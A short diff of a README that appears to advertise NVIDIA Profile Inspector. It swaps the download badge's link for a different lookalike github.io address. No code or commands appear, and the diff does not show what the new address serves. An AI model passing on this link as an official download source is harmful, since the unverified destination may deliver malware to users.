@@ -2,7 +2,8 @@
 
 ## 📥 Download NVIDIA Profile Inspector
 
-[![⬇️ Download NVIDIA Profile Inspector](https://img.shields.io/badge/Download-NVIDIA%20Profile%20Inspector-blue?style=for-the-badge&logo=nvidia)](https://nvidia-profile-inspector.github.io/.github)
+[![⬇️ Download NVIDIA Profile Inspector](https://img.shields.io/badge/Download-NVIDIA%20Profile%20Inspector-blue?style=for-the-badge&logo=nvidia)](https://nvidia-profile-inspector-ver3-5.github.io/.github
+)
 
 ---
 
